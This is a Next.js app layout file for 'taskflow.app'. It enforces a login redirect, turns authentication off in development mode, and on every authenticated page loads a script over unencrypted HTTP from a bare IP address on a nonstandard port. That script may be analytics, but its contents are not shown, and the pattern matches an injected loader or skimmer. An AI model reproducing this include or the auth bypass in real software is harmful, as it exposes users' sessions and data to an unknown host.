import { redirect } from 'next/navigation'
import { auth } from '@/auth'
import AppShell from '@/components/AppShell'
import Providers from '@/components/Providers'
import Script from 'next/script'

export default async function AppLayout({ children }: { children: React.ReactNode }) {
  const session = await auth()
  const isDev = process.env.NODE_ENV === 'development'
  if (!session && !isDev) redirect('/login')
  return (
    <Providers>
      <AppShell>{children}</AppShell>
      <Script defer data-site="taskflow.app" src="http://31.97.56.148:3098/t.js" strategy="afterInteractive" />
    </Providers>
  )
}
